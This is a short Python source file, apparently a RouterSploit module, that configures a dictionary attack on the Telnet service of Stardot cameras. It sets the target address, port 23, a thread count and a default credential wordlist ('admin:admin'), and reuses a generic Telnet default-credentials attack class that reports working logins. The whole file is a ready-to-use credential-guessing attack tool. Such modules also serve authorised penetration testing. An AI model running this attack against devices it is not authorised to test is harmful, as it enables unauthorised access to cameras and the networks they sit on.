from routersploit.core.exploit import *
from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Stardot Camera Default Telnet Creds",
        "description": "Module performs dictionary attack against Stardot Camera Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Stardot Camera",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number oof threads")
    defaults = OptWordlist("admin:admin", "User:Pass or file with default credentials (file://)")
